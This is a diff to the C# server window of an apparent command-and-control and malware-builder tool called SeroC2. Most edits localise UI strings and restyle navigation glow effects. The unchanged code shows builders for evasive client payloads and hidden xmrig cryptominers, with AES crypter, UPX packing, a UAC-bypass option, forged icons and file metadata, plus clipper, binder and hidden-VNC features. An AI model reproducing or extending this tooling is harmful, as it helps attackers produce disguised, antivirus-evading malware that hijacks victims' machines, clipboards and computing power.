@@ -580,7 +580,7 @@ public partial class ServerWindow : ThemedWindow
             Time       = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"),
             User       = user,
             Keyword    = data.Keyword,
-            Connection = client != null ? "Online" : "?",
+            Connection = client != null ? Lang.Get("NAV_ONLINE") : "?",
             Window     = data.Title,
             ClientId   = clientId,
         };
@@ -2070,20 +2070,6 @@ public partial class ServerWindow : ThemedWindow
         }
     }
 
-    private HvncBroadcastWindow? _broadcastWindow;
-    private void HvncBroadcast_Click(object sender, RoutedEventArgs e)
-    {
-        if (_server == null) return;
-        if (_broadcastWindow == null || !_broadcastWindow.IsLoaded)
-        {
-            _broadcastWindow = new HvncBroadcastWindow(_server) { Owner = this };
-            ApplySoftwareRendering(_broadcastWindow);
-            _broadcastWindow.Show();
-        }
-        else
-            _broadcastWindow.Activate();
-    }
-
     private async void Hvnc_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
@@ -2495,7 +2481,7 @@ public partial class ServerWindow : ThemedWindow
         }
 
         BtnTelegramTest.IsEnabled            = false;
-        TxtTelegramTestResult.Text           = "Sending…";
+        TxtTelegramTestResult.Text           = Lang.Get("STATUS_SENDING");
         TxtTelegramTestResult.Foreground     = new System.Windows.Media.SolidColorBrush(
             System.Windows.Media.Color.FromRgb(0x70, 0x90, 0xC0));
 
@@ -2984,7 +2970,7 @@ internal static class Config
         }
         _bldXmrigBytes = null;
         _bldXmrigPath  = null;
-        BldMnrXmrigPath.Text       = "xmrig.exe not found — place in xmrig-release/xmrig.exe";
+        BldMnrXmrigPath.Text       = Lang.Get("MNR_XMRIG_MISSING");
         BldMnrXmrigPath.Foreground = new SolidColorBrush(Color.FromRgb(0xEF, 0x44, 0x44));
     }
 
@@ -3036,12 +3022,12 @@ internal static class MinerConfig
         var minerDir = GetMinerStubProjectDir();
         if (string.IsNullOrEmpty(minerDir) || !Directory.Exists(minerDir))
         {
-            TxtMnrBuildStatus.Text = "Error: MinerStub project not found. Place the miner-stub folder (containing MinerStub.csproj) next to the server exe or in the SeroC2 root directory.";
+            TxtMnrBuildStatus.Text = Lang.Get("MNR_ERR_NO_PROJ");
             return;
         }
         if (_bldXmrigBytes == null || _bldXmrigBytes.Length == 0)
         {
-            TxtMnrBuildStatus.Text = "Error: xmrig.exe not found. Place xmrig.exe in xmrig-release/.";
+            TxtMnrBuildStatus.Text = Lang.Get("MNR_ERR_NO_XMRIG");
             return;
         }
 
@@ -3055,7 +3041,7 @@ internal static class MinerConfig
         var outputExe = dlg.FileName;
 
         BtnMnrBuild.IsEnabled  = false;
-        TxtMnrBuildStatus.Text = "Generating MinerConfig.cs…";
+        TxtMnrBuildStatus.Text = Lang.Get("MNR_STATUS_GEN");
 
         try
         {
@@ -3079,7 +3065,7 @@ internal static class MinerConfig
                 await File.WriteAllBytesAsync(xmrigBinDst, SfcEncode(compressed, _bldSfcSeed!));
             }
 
-            TxtMnrBuildStatus.Text = "Compiling (NativeAOT)…";
+            TxtMnrBuildStatus.Text = Lang.Get("BLD_STATUS_COMPILE");
             Log("[*] MinerBuilder: dotnet publish…");
 
             var tempOut    = Path.Combine(Path.GetTempPath(), "sero_miner_" + Guid.NewGuid().ToString("N")[..8]);
@@ -3112,12 +3098,12 @@ internal static class MinerConfig
             {
                 Log($"[!] MinerBuilder: Build failed (exit {proc.ExitCode})");
                 if (!string.IsNullOrWhiteSpace(stderr)) Log(stderr);
-                TxtMnrBuildStatus.Text = "Build FAILED. Check logs.";
+                TxtMnrBuildStatus.Text = Lang.Get("BLD_STATUS_FAILED");
                 return;
             }
 
             var builtExe = Directory.GetFiles(tempOut, "*.exe").FirstOrDefault();
-            if (builtExe == null) { TxtMnrBuildStatus.Text = "Build output not found."; return; }
+            if (builtExe == null) { TxtMnrBuildStatus.Text = Lang.Get("BLD_STATUS_NO_OUTPUT"); return; }
 
             File.Copy(builtExe, outputExe, true);
             try { Directory.Delete(tempOut, true); } catch { }
@@ -3126,7 +3112,7 @@ internal static class MinerConfig
 
             if (BldMnrEncrypt.IsChecked == true)
             {
-                TxtMnrBuildStatus.Text = "Applying crypter…";
+                TxtMnrBuildStatus.Text = Lang.Get("BLD_STATUS_CRYPTER");
                 Log("[*] MinerBuilder: applying C++ crypter…");
                 try { await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconPath: null, metadata: null, uacBypass: false); Log("[+] MinerBuilder: crypter applied."); }
                 catch (Exception cex) { Log($"[!] MinerBuilder: crypter skipped — {cex.Message}"); }
@@ -3134,7 +3120,7 @@ internal static class MinerConfig
 
             if (BldMnrUpx.IsChecked == true)
             {
-                TxtMnrBuildStatus.Text = "Compressing (UPX)…";
+                TxtMnrBuildStatus.Text = Lang.Get("BLD_STATUS_UPX");
                 Log("[*] MinerBuilder: Running UPX…");
                 string upxExe = "upx";
                 var toolsUpx = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tools", "upx.exe");
@@ -3168,7 +3154,7 @@ internal static class MinerConfig
             Log($"[+] MinerBuilder: PS1 uninstaller → {Path.GetFileName(uninstallerPs1)}");
 
             // Build silent uninstaller .exe from miner-uninstaller project
-            TxtMnrBuildStatus.Text = "Building uninstaller.exe…";
+            TxtMnrBuildStatus.Text = Lang.Get("MNR_STATUS_UNINST");
             var uninstallerExePath = Path.Combine(
                 Path.GetDirectoryName(outputExe)!,
                 Path.GetFileNameWithoutExtension(outputExe) + "_uninstall.exe");
@@ -3558,7 +3544,7 @@ Read-Host 'Press Enter to close'
 
     private void BldSetAssembly_Unchecked(object sender, RoutedEventArgs e)
     {
-        BldAssemblyPath.Text = "No executable selected";
+        BldAssemblyPath.Text = Lang.Get("BLD_NO_EXE");
         BldAssemblyPath.Tag = null;
     }
 
@@ -3582,14 +3568,14 @@ Read-Host 'Press Enter to close'
 
     private void BldSetIcon_Unchecked(object sender, RoutedEventArgs e)
     {
-        BldIconPath.Text = "No icon selected";
+        BldIconPath.Text = Lang.Get("BLD_NO_ICON");
     }
 
     private async void Build_Click(object sender, RoutedEventArgs e)
     {
         if (BldHosts.Items.Count == 0)
         {
-            MessageBox.Show("Add at least one host before building.", "No Host Configured",
+            MessageBox.Show(Lang.Get("BLD_NO_HOST_MSG"), Lang.Get("BLD_NO_HOST_TITLE"),
                 MessageBoxButton.OK, MessageBoxImage.Warning);
             return;
         }
@@ -3627,7 +3613,7 @@ Read-Host 'Press Enter to close'
 
         BtnBuild.IsEnabled = false;
         BuilderPanel.IsEnabled = false;
-        TxtBuildStatus.Text = "Generating config...";
+        TxtBuildStatus.Text = Lang.Get("BLD_STATUS_GEN");
         Log("[*] Builder: Starting build...");
 
         try
@@ -3767,14 +3753,14 @@ Read-Host 'Press Enter to close'
             await Task.Run(() => { try { if (Directory.Exists(binDir)) Directory.Delete(binDir, true); } catch { } });
 
             // Always NativeAOT — best evasion + modular native DLL plugins via NativeLibrary.Load
-            TxtBuildStatus.Text = "Compiling (NativeAOT)...";
+            TxtBuildStatus.Text = Lang.Get("BLD_STATUS_COMPILE");
             Log("[*] Builder: dotnet publish (NativeAOT)...");
 
             var tempOut = Path.Combine(Path.GetTempPath(), "sero_build_" + Guid.NewGuid().ToString("N")[..8]);
 
             var iconArg = "";
             var iconRaw = BldIconPath.Text;
-            if (iconRaw != "No icon selected" && !iconRaw.Contains('"') && File.Exists(iconRaw))
+            if (BldSetIcon.IsChecked == true && !iconRaw.Contains('"') && File.Exists(iconRaw))
             {
                 iconArg = $" -p:ApplicationIcon=\"{iconRaw}\"";
                 Log($"[*] Builder: Icon will be embedded: {iconRaw}");
@@ -3832,14 +3818,14 @@ Read-Host 'Press Enter to close'
             {
                 try { proc.Kill(entireProcessTree: true); } catch { }
                 Log("[!] Builder: NativeAOT compile timed out (>20 min) — process killed.");
-                TxtBuildStatus.Text = "Build timed out (>20 min).";
+                TxtBuildStatus.Text = Lang.Get("BLD_STATUS_TIMEOUT");
                 return;
             }
 
             if (proc.ExitCode != 0)
             {
                 Log($"[!] Builder: Build failed (exit {proc.ExitCode})");
-                TxtBuildStatus.Text = "Build FAILED. Check logs.";
+                TxtBuildStatus.Text = Lang.Get("BLD_STATUS_FAILED");
                 NotificationService.NotifyBuildError();
                 return;
             }
@@ -3854,7 +3840,7 @@ Read-Host 'Press Enter to close'
                 else
                 {
                     Log("[!] Builder: Output exe not found.");
-                    TxtBuildStatus.Text = "Build output not found.";
+                    TxtBuildStatus.Text = Lang.Get("BLD_STATUS_NO_OUTPUT");
                     return;
                 }
             }
@@ -3870,11 +3856,11 @@ Read-Host 'Press Enter to close'
                 if (uacBypass && BldEncrypt.IsChecked != true)
                     Log("[*] Builder: UAC bypass requires the native loader — crypter applied automatically.");
 
-                TxtBuildStatus.Text = "Applying crypter...";
+                TxtBuildStatus.Text = Lang.Get("BLD_STATUS_CRYPTER");
                 Log("[*] Builder: Applying AES crypter...");
 
                 // Pass icon + metadata so the C++ loader is compiled with them via rc.exe
-                string? iconForLoader = (BldIconPath.Text != "No icon selected" && File.Exists(BldIconPath.Text))
+                string? iconForLoader = (BldSetIcon.IsChecked == true && File.Exists(BldIconPath.Text))
                     ? BldIconPath.Text : null;
                 var meta = (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
                     ? new SeroServer.Builder.LoaderMetadata(product, company, fileVersion, productVersion, assemblyTitle, copyright)
@@ -3889,7 +3875,7 @@ Read-Host 'Press Enter to close'
 
             if (BldUpx.IsChecked == true)
             {
-                TxtBuildStatus.Text = "Compressing (UPX)...";
+                TxtBuildStatus.Text = Lang.Get("BLD_STATUS_UPX");
                 Log("[*] Builder: Running UPX...");
                 string upxExe = "upx";
                 var toolsUpx = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tools", "upx.exe");
@@ -4016,14 +4002,14 @@ Read-Host 'Press Enter to close'
     {
         try
         {
-            TxtPortResult.Text = "Getting IP...";
+            TxtPortResult.Text = Lang.Get("PORT_GETTING_IP");
             using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(5) };
             var ip = (await http.GetStringAsync("https://api.ipify.org")).Trim();
             SettingsCheckIP.Text = ip;
             TxtPortResult.Text = $"Your public IP: {ip}";
             TxtPortResult.Foreground = (Brush)FindResource("DimBrush");
         }
-        catch { TxtPortResult.Text = "Failed to get IP."; }
+        catch { TxtPortResult.Text = Lang.Get("PORT_FAILED_IP"); }
     }
 
     private async void CheckPort_Click(object sender, RoutedEventArgs e)
@@ -4031,14 +4017,14 @@ Read-Host 'Press Enter to close'
         var ip = SettingsCheckIP.Text.Trim();
         if (!int.TryParse(SettingsCheckPort.Text.Trim(), out int port) || port < 1 || port > 65535)
         {
-            TxtPortResult.Text = "Invalid port.";
+            TxtPortResult.Text = Lang.Get("PORT_INVALID");
             TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
             return;
         }
 
         if (ip is "127.0.0.1" or "localhost" or "::1" or "0.0.0.0" or "")
         {
-            TxtPortResult.Text = "Cannot check localhost.";
+            TxtPortResult.Text = Lang.Get("PORT_NO_LOCALHOST");
             TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
             return;
         }
@@ -4740,7 +4726,7 @@ Read-Host 'Press Enter to close'
             var authKey = BldAuthKey.Text.Trim();
             if (string.IsNullOrEmpty(authKey))
             {
-                MessageBox.Show("Generate or set an auth key in the Builder tab before exporting a backup.",
+                MessageBox.Show(Lang.Get("BLD_AUTH_KEY_MSG"),
                     "Sero — No Auth Key", MessageBoxButton.OK, MessageBoxImage.Warning);
                 return;
             }
@@ -5529,7 +5515,7 @@ Read-Host 'Press Enter to close'
 
     private async void BtnBinderBuild_Click(object sender, RoutedEventArgs e)
     {
-        if (_binderEntries.Count == 0) { TxtBinderStatus.Text = "No files added."; return; }
+        if (_binderEntries.Count == 0) { TxtBinderStatus.Text = Lang.Get("BINDER_NO_FILES"); return; }
         var dlg = new Microsoft.Win32.SaveFileDialog
         {
             Title      = "Save binder output",
@@ -5541,7 +5527,7 @@ Read-Host 'Press Enter to close'
         var output = dlg.FileName;
 
         BtnBinderBuild.IsEnabled = false;
-        TxtBinderStatus.Text = "Building…";
+        TxtBinderStatus.Text = Lang.Get("BINDER_BUILDING");
 
         var entries = _binderEntries.ToList();
         var icon    = _binderIconPath;
@@ -5770,11 +5756,15 @@ Read-Host 'Press Enter to close'
         // Cancel any leave-fade so the trigger Setter (Opacity=1) retakes control
         glow.BeginAnimation(Border.OpacityProperty, null);
 
-        // Adapt glow colour to current accent
+        // Adapt glow to current accent: bright white-tinted hot-spot + accent halo
         if (TryFindResource("AccentColor") is System.Windows.Media.Color accent)
         {
-            rgb.GradientStops[0].Color = System.Windows.Media.Color.FromArgb(60, accent.R, accent.G, accent.B);
-            rgb.GradientStops[1].Color = System.Windows.Media.Color.FromArgb(14, accent.R, accent.G, accent.B);
+            // Blend accent toward white for a luminous "light source" centre
+            byte hr = (byte)(accent.R + (255 - accent.R) * 0.55);
+            byte hg = (byte)(accent.G + (255 - accent.G) * 0.55);
+            byte hb = (byte)(accent.B + (255 - accent.B) * 0.55);
+            rgb.GradientStops[0].Color = System.Windows.Media.Color.FromArgb(98, hr, hg, hb);
+            rgb.GradientStops[1].Color = System.Windows.Media.Color.FromArgb(34, accent.R, accent.G, accent.B);
         }
 
         var pos = e.GetPosition(btn);
@@ -5790,19 +5780,49 @@ Read-Host 'Press Enter to close'
         if (btn.Template.FindName("SpotGlow", btn) is not Border glow) return;
         if (glow.Background is not System.Windows.Media.RadialGradientBrush rgb) return;
         if (rgb.IsFrozen) { rgb = rgb.Clone(); glow.Background = rgb; }
-        rgb.GradientOrigin = new System.Windows.Point(0.5, 0.5);
-        rgb.Center         = new System.Windows.Point(0.5, 0.5);
 
-        // Smooth fade to the resting value (0 when not selected, 0.15 when selected)
-        double restOpacity = btn.IsChecked == true ? 0.15 : 0.0;
+        // Smooth fade to the resting value (0 when not selected, 0.22 when selected)
+        bool isChecked     = btn.IsChecked == true;
+        double restOpacity = isChecked ? 0.22 : 0.0;
         var fade = new System.Windows.Media.Animation.DoubleAnimation(
-            restOpacity, TimeSpan.FromMilliseconds(250))
+            restOpacity, TimeSpan.FromMilliseconds(280))
         {
             EasingFunction = new System.Windows.Media.Animation.CubicEase
                 { EasingMode = System.Windows.Media.Animation.EasingMode.EaseOut },
             FillBehavior = System.Windows.Media.Animation.FillBehavior.Stop
         };
+        // After fading, re-centre the glow on the active button
+        if (isChecked) fade.Completed += (_, _) => ApplyNavBtnGlow(btn);
+        else
+        {
+            rgb.GradientOrigin = new System.Windows.Point(0.5, 0.5);
+            rgb.Center         = new System.Windows.Point(0.5, 0.5);
+        }
         glow.BeginAnimation(Border.OpacityProperty, fade);
+    }
+
+    // Re-applies the accent-coloured glow centred on a nav button (called when it becomes
+    // selected or the accent changes, so the resting glow is always theme-accurate).
+    private void ApplyNavBtnGlow(System.Windows.Controls.RadioButton btn)
+    {
+        try
+        {
+            btn.ApplyTemplate();
+            if (btn.Template.FindName("SpotGlow", btn) is not Border glow) return;
+            if (glow.Background is not System.Windows.Media.RadialGradientBrush rgb) return;
+            if (rgb.IsFrozen) { rgb = rgb.Clone(); glow.Background = rgb; }
+            if (TryFindResource("AccentColor") is System.Windows.Media.Color accent)
+            {
+                byte hr = (byte)(accent.R + (255 - accent.R) * 0.55);
+                byte hg = (byte)(accent.G + (255 - accent.G) * 0.55);
+                byte hb = (byte)(accent.B + (255 - accent.B) * 0.55);
+                rgb.GradientStops[0].Color = System.Windows.Media.Color.FromArgb(98, hr, hg, hb);
+                rgb.GradientStops[1].Color = System.Windows.Media.Color.FromArgb(34, accent.R, accent.G, accent.B);
+                rgb.GradientOrigin = new System.Windows.Point(0.5, 0.5);
+                rgb.Center         = new System.Windows.Point(0.5, 0.5);
+            }
+        }
+        catch { }
     }
 
     private void Nav_Checked(object sender, RoutedEventArgs e)
@@ -5827,6 +5847,9 @@ Read-Host 'Press Enter to close'
         };
         if (idx >= 0 && MainTabControl.SelectedIndex != idx)
             MainTabControl.SelectedIndex = idx;
+
+        // Accent-colour the resting glow on the newly-selected button
+        ApplyNavBtnGlow(rb);
     }
 
     private void SyncNavButtons(int idx)
@@ -6061,6 +6084,15 @@ Read-Host 'Press Enter to close'
             hoverBrush.Freeze();
             r2["RowHoverBgBrush"] = hoverBrush;
             Resources["RowHoverBgBrush"] = hoverBrush;
+
+            // Re-apply accent glow on the active nav button after accent colour settles
+            System.Windows.Controls.RadioButton?[] _navBtns =
+            [
+                NavDashboard, NavOnline, NavAllClients, NavBuilder, NavAutoTask,
+                NavScreen, NavClipper, NavBinder, NavWinNotify, NavLogs, NavSettings, NavAbout
+            ];
+            foreach (var nb in _navBtns)
+                if (nb?.IsChecked == true) ApplyNavBtnGlow(nb);
         }, System.Windows.Threading.DispatcherPriority.ContextIdle);
 
         // Write to Application.Current.Resources so ALL open windows update immediately
